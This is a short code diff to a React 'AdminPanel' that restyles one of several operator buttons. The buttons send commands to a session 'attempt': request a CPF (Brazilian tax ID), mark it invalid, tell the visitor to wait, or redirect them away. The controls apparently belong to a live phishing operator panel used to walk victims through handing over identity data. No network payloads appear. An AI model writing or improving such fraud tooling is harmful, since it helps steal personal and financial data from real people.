@@ -736,7 +736,7 @@ function AdminPanel() {
                       <button onClick={() => sendCommand(attempt.id, "CPF")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">Pedir CPF</button>
                       <button onClick={() => sendInvalidCommand(attempt.id, "CPF")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
                       
-                      <button onClick={() => sendCommand(attempt.id, "AGUARDE")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">Aguarde</button>
+                      <button onClick={() => sendCommand(attempt.id, "AGUARDE")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-emerald-500/10 text-emerald-400 hover:bg-emerald-500/20 border border-emerald-500/20 transition-all">Aguarde</button>
                       <button onClick={() => sendCommand(attempt.id, "REDIRECT")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">Expulsar</button>
                     </div>
 
